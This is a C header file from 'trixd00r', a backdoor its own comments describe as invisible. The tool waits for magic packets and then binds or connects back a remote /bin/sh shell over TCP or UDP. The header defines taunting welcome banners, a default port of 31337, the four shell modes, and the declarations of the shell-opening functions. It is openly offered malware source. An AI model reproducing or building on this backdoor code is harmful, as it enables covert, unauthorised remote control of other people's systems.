/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/inc/shell.h                                                          *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#ifndef __SHELL_H__
#define __SHELL_H__


#include "trixd00rd.h"
#include "sniffer.h"

#include <netinet/in.h>


/* welcome banner */
#define BAN_WELCOME1 "\
@@@@@@@  @@@@@@@   @@@  @@@  @@@  @@@@@@@    @@@@@@@@    @@@@@@@@   @@@@@@@\n\
@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@@@  @@@@@@@@@@  @@@@@@@@\n\
  @@!    @@!  @@@  @@!  @@!  !@@  @@!  @@@  @@!   @@@@  @@!   @@@@  @@!  @@@\n\
  !@!    !@!  @!@  !@!  !@!  @!!  !@!  @!@  !@!  @!@!@  !@!  @!@!@  !@!  @!@\n\
  @!!    @!@!!@!   !!@   !@@!@!   @!@  !@!  @!@ @! !@!  @!@ @! !@!  @!@!!@!\n\
  !!!    !!@!@!    !!!    @!!!    !@!  !!!  !@!!!  !!!  !@!!!  !!!  !!@!@!\n"

#define BAN_WELCOME2 "\
  !!:    !!: :!!   !!:   !: :!!   !!:  !!!  !!:!   !!!  !!:!   !!!  !!: :!!\n\
  :!:    :!:  !:!  :!:  :!:  !:!  :!:  !:!  :!:    !:!  :!:    !:!  :!:  !:!\n\
   ::    ::   :::   ::   ::  :::   :::: ::  ::::::: ::  ::::::: ::  ::   :::\n\
   :      :   : :  :     :   ::   :: :  :    : : :  :    : : :  :    :   : :\n\n\
        ..:: w3lc0m3 h4x0r (0r m4yb3 ju5t 4 5cr1pt k1ddy?) ::..\n\
                                    --\n\
                            3nj0y y0ur sh3ll\n"

/* bye bye banner */
#define BAN_BYE "h4v3 a n1c3 d4y..."


/* banner types */
#define _BAN_WELCOME    0
#define _BAN_BYE        1


/* default values */
#define DEF_MODE    _TCP_BIND_PORT  /* shell mode */
#define DEF_PORT    31337           /* port for shell */


/* socket buffer for read() / write() */
#define SOCKBUF 4096


/* available shell modes (description) */
#define TCP_BIND_PORT   "TCP bind port"
#define TCP_CONN_BACK   "TCP connect back"
#define UDP_BIND_PORT   "UDP bind port"
#define UDP_CONN_BACK   "UDP connect back"


/* shell */
#define SHELL  "/bin/sh"


/* shell modes */
enum {
    _TCP_BIND_PORT = 0, _TCP_CONN_BACK, _UDP_BIND_PORT, _UDP_CONN_BACK,
    _NUM_SHELL_MODES
};


/* print available shell modes */
void print_shell_modes();


/* either connect back or bind port and send shell */
void open_shell(ctrl_t *);


/* send welcome or bye banner to the client */
void send_banner(shell_t *, unsigned char);
#define __SEND_BANNER(type) \
    if (shell->banner) { send_banner(shell, type); }

#endif

/* EOF */
